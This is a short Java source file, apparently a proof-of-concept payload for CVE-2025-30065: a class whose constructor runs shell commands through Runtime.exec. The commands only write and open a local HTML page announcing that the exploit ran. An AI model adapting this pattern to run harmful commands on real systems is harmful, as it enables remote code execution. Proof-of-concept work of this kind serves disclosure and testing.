// DISCLAIMER: For authorized security research only.
package com.evil;

public class RCEPayload {
    public RCEPayload(String input) {
        try {
            Runtime.getRuntime().exec(new String[] {
                    "sh", "-c", "echo '<!DOCTYPE html><html><body><h1>CVE-2025-30065 Exploit Executed </h1></body></html>' > exploit.html"
            });
            Runtime.getRuntime().exec(new String[] {
                    "sh", "-c", "open exploit.html"
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
